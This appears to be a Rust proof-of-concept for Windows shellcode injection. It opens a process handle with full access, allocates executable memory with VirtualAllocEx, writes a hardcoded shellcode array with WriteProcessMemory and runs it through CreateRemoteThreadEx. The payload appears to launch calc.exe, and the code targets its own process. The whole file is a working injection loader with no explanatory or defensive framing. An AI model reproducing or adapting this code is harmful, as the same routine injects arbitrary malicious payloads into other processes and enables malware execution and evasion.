use windows::{
    Win32::{
        System::{
            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
            Diagnostics::Debug::WriteProcessMemory, 
            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
        },
        Foundation::CloseHandle,
    },
};
use std::{ptr::{self, null_mut, null}, process, mem};

fn main() {

    let shellcode: &[u8] = &[
        0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
        0x53, 0xb8, 0x80, 0x22, 0xbf, 0x74, 0xff, 0xd0,
        0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0d,
        0x53, 0x50, 0xb8, 0xa0, 0x05, 0xbf, 0x74, 0xff,
        0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88, 0x53,
        0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88, 0x51,
        0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52, 0x53,
        0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52, 0xb8,
        0x20, 0x4f, 0xbf, 0x74, 0xff, 0xd0, 0xe8, 0xb7,
        0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c, 0x6c,
        0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x58, 0xe8,
        0xb6, 0xff, 0xff, 0xff, 0x53, 0x68, 0x65, 0x6c,
        0x6c, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65,
        0x41, 0x58, 0xe8, 0xb4, 0xff, 0xff, 0xff, 0x63,
        0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x58,
        0xe8, 0xae, 0xff, 0xff, 0xff, 0x6f, 0x70, 0x65,
        0x6e, 0x58
    ];

    unsafe {
        println!("[i] Trying to open a Handle for the Process");
        match OpenProcess(PROCESS_ALL_ACCESS, false, process::id()) {
            Ok(hprocess) => 'p: {
                let haddr = VirtualAllocEx(
                    hprocess,
                    Some(null_mut()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );

                if haddr.is_null() {
                    eprintln!("[!] Failed to Allocate Memory in Target Process.");
                    let _ = CloseHandle(hprocess);
                    process::exit(-1)
                }

                println!("[i] Writing to memory");
                WriteProcessMemory(
                    hprocess,
                    haddr, 
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    None).unwrap_or_else(|e| {
                        eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
                        let _ = CloseHandle(hprocess);
                        process::exit(-1);
                    }
                );
                
                println!("[+] Creating a Remote Thread");
                let hthread = CreateRemoteThreadEx(
                    hprocess,
                    Some(null()),
                    0,
                    Some(mem::transmute(haddr)),
                    Some(null()),
                    0,
                    None,
                    Some(null_mut()),).unwrap_or_else(|e| {
                        eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                        let _ = CloseHandle(hprocess);
                        process::exit(-1);
                    }
                );

                WaitForSingleObject(hthread, INFINITE);

                let _ = CloseHandle(hprocess);
                let _ = CloseHandle(hthread);

                println!("[+] Executed!!");
                break 'p;
            }
            Err(pid) => {
                eprintln!("[!] Error Getting Process Identifier {pid}");
            }
        }
    }
}